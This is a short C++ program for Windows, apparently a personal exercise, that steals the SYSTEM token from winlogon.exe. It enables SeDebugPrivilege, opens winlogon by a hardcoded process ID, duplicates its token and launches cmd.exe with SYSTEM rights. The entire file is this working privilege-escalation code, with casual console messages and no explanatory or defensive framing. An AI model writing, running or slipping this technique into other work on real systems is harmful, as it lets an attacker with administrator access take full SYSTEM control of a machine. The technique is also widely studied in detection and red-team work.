#include <Windows.h>
#include <iostream>

int winlogon = 10300;

void enabletoken() {
  HANDLE thishandle = GetCurrentProcess();
  HANDLE hToken;
  bool success = OpenProcessToken(
      thishandle, TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, &hToken);
  if (!success) {
    std::cout << "failed to get token" << std::endl;
    return;
  }
  std::cout << "got token." << std::endl;
  LUID luid;
  bool looksuccess = LookupPrivilegeValueW(NULL, L"SeDebugPrivilege", &luid);
  if (!looksuccess) {
    std::cout << "failed to lookup privilege value." << std::endl;
    return;
  }
  std::cout << "got LUID" << std::endl;
  TOKEN_PRIVILEGES tp;
  tp.PrivilegeCount = 1;
  tp.Privileges[0].Luid = luid;
  tp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;

  bool adjustsuccess = AdjustTokenPrivileges(
      hToken, false, &tp, sizeof(TOKEN_PRIVILEGES), NULL, NULL);
  if (!adjustsuccess) {
    std::cout << "failed to adjust token privileges." << std::endl;
    return;
  }
  std::cout << "Enabled SeDebugPrivileges successfully." << std::endl;
}

HANDLE StealSystemToken() {
  HANDLE winH = OpenProcess(PROCESS_QUERY_INFORMATION, false, winlogon);
  if (winH == NULL) {
    auto error = GetLastError();
    std::cout << "failed to get handle to winlogon.exe. error: " << error
              << std::endl;
    return NULL;
  }
  std::cout << "got handle to winlogon.exe" << std::endl;
  HANDLE hToken;
  bool taketoken = OpenProcessToken(winH, TOKEN_DUPLICATE, &hToken);
  if (!taketoken) {
    std::cout << "failed to duplicate token from winlogon.exe." << std::endl;
    CloseHandle(winH);
    return NULL;
  }

  std::cout << "successfully duplicated token from winlogon.exe" << std::endl;
  return hToken;
}

void LaunchSystemCmd(HANDLE winHandle) {
  HANDLE newT;
  bool dupesuccess =
      DuplicateTokenEx(winHandle, MAXIMUM_ALLOWED, NULL, SecurityImpersonation,
                       TokenPrimary, &newT);
  if (!dupesuccess) {
    std::cout << "failed to dupe winlogon token handle." << std::endl;
    CloseHandle(winHandle);
    return;
  }
  std::cout << "duped winlogon token handle." << std::endl;
  STARTUPINFOW si = {sizeof(si)};
  PROCESS_INFORMATION pi = {0};

  bool createsuccess = CreateProcessWithTokenW(
      newT, LOGON_WITH_PROFILE, L"C:\\Windows\\System32\\cmd.exe", NULL, 0,
      NULL, NULL, &si, &pi);

  if (!createsuccess) {
    std::cout << "failed to create cmd." << std::endl;
    CloseHandle(newT);
    CloseHandle(winHandle);
    return;
  }
  std::cout << "successfully created new system cmd. im fucking amazing"
            << std::endl;

  CloseHandle(newT);
  CloseHandle(winHandle);
  CloseHandle(pi.hProcess);
  CloseHandle(pi.hThread);
}

int main() {
  std::cout << "steal token system..\n";
  enabletoken();
  HANDLE winH = StealSystemToken();
  LaunchSystemCmd(winH);
}
